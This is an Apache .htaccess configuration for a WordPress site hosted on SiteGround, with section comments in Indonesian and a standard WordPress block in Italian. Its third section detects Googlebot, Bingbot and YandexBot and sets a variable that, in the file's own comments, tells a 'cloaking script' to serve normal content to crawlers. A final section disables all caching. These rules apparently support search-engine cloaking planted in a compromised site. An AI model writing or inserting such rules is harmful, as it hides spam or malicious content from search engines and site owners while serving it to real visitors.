# =========================================================
# 1. KONFIGURASI PHPRC (PENGATURAN PHP.INI)
# =========================================================
SetEnv PHPRC /home/customer/www/santuariosantarita.it/public_html/php.ini

# =========================================================
# 2. ATURAN KEAMANAN (SITEGROUND OPTIMIZER)
# =========================================================
# SGS XMLRPC Disable Service: Memblokir akses langsung ke xmlrpc.php
<Files xmlrpc.php>
	order deny,allow
	deny from all
</Files>
# SGS XMLRPC Disable Service END


# =========================================================
# 3. ATURAN INTERVENSI CLOAKING/BOT KUSTOM
# (Paksa script cloaking menyajikan konten default untuk Googlebot)
# =========================================================
<IfModule mod_rewrite.c>
	# Pastikan mesin rewrite dihidupkan untuk aturan ini
	RewriteEngine On
	
	# Deteksi Googlebot (Case Insensitive: [NC])
	# Jika User-Agent adalah Googlebot, set Environment Variable kustom.
	# Script cloaking Anda harus membaca variabel ini (misalnya, FORCED_BYPASS) 
	# untuk menyajikan konten normal.
	RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yandexbot) [NC]
	RewriteRule ^ - [E=FORCE_CLOAKING_BYPASS:1] 
</IfModule>


# =========================================================
# 4. ATURAN UTAMA WORDPRESS
# =========================================================
# BEGIN WordPress
# Le direttive (linee) tra "BEGIN WordPress" e "END WordPress" sono
# generate dinamicamente, e dovrebbero essere modificate solo tramite i filtri di WordPress.
# Ogni modifica alle direttive tra questi marcatori verrà sovrascritta.
<IfModule mod_rewrite.c>
	RewriteEngine On
	RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
	RewriteBase /
	RewriteRule ^index\.php$ - [L]
	RewriteCond %{REQUEST_FILENAME} !-f
	RewriteCond %{REQUEST_FILENAME} !-d
	RewriteRule . /index.php [L]
</IfModule>

# END WordPress


# =========================================================
# 5. ATURAN OPTIMASI HEADER (SITEGROUND OPTIMIZER)
# =========================================================
# SGO Unset Vary
 Header unset Vary
# SGO Unset Vary END

# =========================================================
# 6. ATURAN TAMBAHAN UNTUK MENONAKTIFKAN CACHING SGO LEVEL SERVER
# =========================================================
# SGS Cache Bypass: Baris ini memaksa header untuk tidak menyimpan cache untuk semua pengguna.
# Meskipun Anda menonaktifkan fitur di dashboard, aturan ini menambah lapisan jaminan
# bahwa header caching server tidak dikirim.
<IfModule mod_headers.c>
    Header set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header set Pragma "no-cache"
    Header set Expires "Wed, 11 Jan 1984 05:00:00 GMT"
</IfModule>
